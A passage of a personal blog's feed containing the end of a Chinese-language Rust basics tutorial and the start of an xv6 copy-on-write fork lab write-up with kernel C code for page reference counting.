class="line">    <span class="comment">// let mut x = 5;</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常量-const"><a href="#常量-const" class="headerlink" title="常量 const"></a>常量 const</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;const_name&#125;: &#123;const_type&#125; = &#123;const_value&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PI: <span class="type">f32</span> = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>必须注明常量类型</p><h3 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h3><p>一个变量名可以重复声明，便于在类型转换等情况时复用变量名，实际上是创建了一个新变量，之前的变量会被隐藏，直到新变量的作用域结束</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-5&quot;</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Not a number&quot;</span>);</span><br><span class="line">        x = x + <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// x = 0</span></span><br><span class="line"><span class="comment">// x = -5</span></span><br></pre></td></tr></table></figure><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Rust 有标量和复合两类数据类型</p><h3 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h3><h4 id="整型-integer"><a href="#整型-integer" class="headerlink" title="整型 integer"></a>整型 integer</h4><table><thead><tr><th>Len</th><th>signed</th><th>unsigned</th></tr></thead><tbody><tr><td>8-bit</td><td>i8</td><td>i8</td></tr><tr><td>32-bit</td><td>i32</td><td>i32</td></tr><tr><td>64-bit</td><td>i64</td><td>i64</td></tr><tr><td>128-bit</td><td>i128</td><td>i128</td></tr><tr><td>arch</td><td>isize</td><td>isize</td></tr><tr><td>Rust 默认类型为 <code>i32</code></td><td></td><td></td></tr></tbody></table><p>arch 依赖计算机架构，64 位架构 <code>isize</code> 就是 64 位</p><p>数字可使用 <code>_</code> 作为分隔符，方便读数，如 <code>1000</code> 表示为 <code>1_000</code> </p><p>也可以使用类型后缀来指定数字类型，如 <code>57u8</code> 为无符号 8-bit 整型</p><table><thead><tr><th>字面值</th><th>例子</th></tr></thead><tbody><tr><td>Hex</td><td>0xff</td></tr><tr><td>Decimal</td><td>0o77</td></tr><tr><td>Octal</td><td>99</td></tr><tr><td>Binary</td><td>0b11</td></tr><tr><td>Byte</td><td>b’a’</td></tr></tbody></table><h4 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型 float"></a>浮点型 float</h4><p>Rust 浮点数类型有 <code>f32</code> 和 <code>f64</code>，默认为 <code>f64</code> 类型，精度更高</p><h4 id="布尔型-bool"><a href="#布尔型-bool" class="headerlink" title="布尔型 bool"></a>布尔型 bool</h4><p><code>true</code> 和 <code>false</code> 两个值</p><h4 id="字符型-char"><a href="#字符型-char" class="headerlink" title="字符型 char"></a>字符型 char</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">c</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">heart_eyed_cat</span>: <span class="type">char</span> = &#x27;😻&#x27;;</span><br></pre></td></tr></table></figure><p>这里的 <code>char</code> 大小是四个字节，Unicode 编码，可以表示比 ASCII 更多的内容，如中日韩文、emoji 等</p><p>字符型的值必须使用单引号表示，双引号为字符串</p><h3 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h3><h4 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组 tuple"></a>元组 tuple</h4><p>元组可以将多个类型的值组合进一个复合类型，长度不可变，类似 C 语言的结构体</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>类型可省略，省略后为默认类型</p><p>从元组上取值</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解构，destructuring</span></span><br><span class="line"><span class="keyword">let</span> (x, y, z) = tup;</span><br><span class="line"><span class="comment">// 索引</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = tup.<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = tup.<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">z</span> = tup.<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>不带任何值的元组，称为单元元组</p><h4 id="数组-array"><a href="#数组-array" class="headerlink" title="数组 array"></a>数组 array</h4><p>数组的元素类型必须相同，长度固定</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// 长度为 4，元素类型为 i32 的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: [<span class="type">i32</span>; <span class="number">4</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// 长度为 5，元素全为 3 的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素访问</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">first</span> = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>越界访问会直接导致 panic，这是 Rust 的一个安全机制</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>使用 <code>fn</code> 关键字声明函数，函数名和变量名使用 <code>snake case</code> 规范风格，字母全部小写</p><p>Rust 不像 C 语言需要在 调用函数 的前面声明 被调用函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> &#123;func_name&#125; (&#123;var_name1&#125;: &#123;var_type1&#125;, ..) <span class="punctuation">-&gt;</span> &#123;ret_type&#125;&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;x&#125; + &#123;y&#125; = &#123;&#125;&quot;</span>, <span class="title function_ invoke__">my_func</span>(x, y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须指定参数类型</p><h3 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h3><p>Rust 是<strong>基于表达式</strong>的语言</p><p>表达式：计算并产生一个值。大部分 Rust 代码由表达式组成，数学运算、函数调用、宏调用、大括号创建的块作用于都是一个表达式</p><p>语句：执行一些操作但不返回值的指令。当表达式结尾加上分号时，它就变成了语句。函数定义也是一个语句</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">    x + <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;y&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: </span></span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure><p>这里的代码块 <code>&#123;let x = 3; x + 1&#125;</code> 由于结尾没有分号，是一个表达式，返回值是 4</p><p>在有返回值的函数中可以主动使用 <code>return</code> 返回值，也可以隐式地返回函数中最后的表达式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在返回表达式时，结尾不可加分号，否则它就不是表达式了</p><h2 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h2><p>Rust 中控制流的表达式必须返回 bool 类型</p><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>let</code> 语句中使用 if-else</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">condition</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;The value of number is: &#123;number&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="loop、while、for"><a href="#loop、while、for" class="headerlink" title="loop、while、for"></a>loop、while、for</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无限循环</span></span><br><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两种遍历数组的方式</span></span><br><span class="line"><span class="keyword">while</span> i &lt; a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0..a.len() 相当于 Python 的 range(0, len(a))</span></span><br><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>break、continue</strong></p><p>简单的 <code>break</code>、<code>continue</code> 可以跳出一层循环</p><p><code>break</code>、<code>continue</code> 后加上表达式，可以返回值</p><p>想要跳出嵌套循环，在指定循环前标记一个<strong>循环标签</strong>，与 <code>break</code> 或 <code>continue</code> 一起使用，可以作用于标记的循环，<code>循环标签</code>前需要加单引号 <code>&#39;</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res = 20</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">res</span> = <span class="keyword">loop</span> &#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套循环</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"><span class="symbol">&#x27;counting_up</span>: <span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;count = &#123;count&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">remaining</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;remaining = &#123;remaining&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> remaining == <span class="number">9</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> <span class="symbol">&#x27;counting_up</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        remaining -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;End count = &#123;count&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;仅仅介绍 Rust 的安装、Cargo、变量、数据类型、函数和控制流&lt;/p&gt;</summary>
    
    
    
    <category term="Programming" scheme="https://humoooor.cn/categories/Programming/"/>
    
    
    <category term="Tools" scheme="https://humoooor.cn/tags/Tools/"/>
    
    <category term="Rust" scheme="https://humoooor.cn/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Lab5 Copy-on-write fork</title>
    <link href="https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/"/>
    <id>https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/</id>
    <published>2022-11-12T01:25:00.000Z</published>
    <updated>2024-01-04T04:30:09.910Z</updated>
    
    <content type="html"><![CDATA[<p>页表牛逼</p><span id="more"></span><h2 id="实现-Copy-on-write-fork"><a href="#实现-Copy-on-write-fork" class="headerlink" title="实现 Copy-on-write fork"></a>实现 Copy-on-write fork</h2><ol><li>添加宏定义 PTE_COW，使用 PTE 的 RSW 最低有效位，来标识是否是 COW 页，只用于可写页</li></ol><figure class="highlight c"><figcaption><span>kernel/riscv.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COW (1L &lt;&lt; 8)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>添加 reference count 标识一个物理页面被几个用户页表指向，初始化，增减</li></ol><p>提示使用 kenel/kalloc.c 里 <code>kinit()</code> 里 <code>freerange()</code> 的范围，通过调试 end = 0x80041c50，PHYSTOP = 0x88000000，相减除以 4096 得 0x7fbe</p><p>但是在 make qemu 时，过 <code>usertests -q</code> 时，最后会显示丢失一些页，但是 make CPUS=1 qemu-gdb 时又显示通过，可能子啊多核时会出现一些问题，很怪</p><p>将 0x7fbe 改为 0x7fc0 就没有问题，不是很懂，如果有了解的师傅可以告诉我🐎</p><p>笔者把它放到 kmem 里，增减时用 kmem.lock 锁</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">  uint refers[<span class="number">0x7fc0</span>];</span><br><span class="line">&#125; kmem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kinit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kmem.refers) / <span class="keyword">sizeof</span>(kmem.refers[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">    kmem.refers[i]++;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  freerange(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  krefDecre(pa);</span><br><span class="line">  <span class="keyword">if</span>(!kref(pa)) &#123;</span><br><span class="line">    <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">    krefIncre((<span class="type">void</span>*)r);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint</span><br><span class="line"><span class="title function_">kref</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefIncre</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]++;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefDecre</span><span class="params">(<span class="type">void</span> *pa)</span> &#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]--;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 <code>uvmcopy</code>，在复制时将子进程页表直接指向父进程页表对应的物理地址</li></ol><p>因为在调用 <code>fork</code> 时，复制内存就是直接调用 <code>uvmcopy</code>，修改这个就行</p><p>当遇到可写的页时，取消 PTE_W，添加 PTE_COW</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not 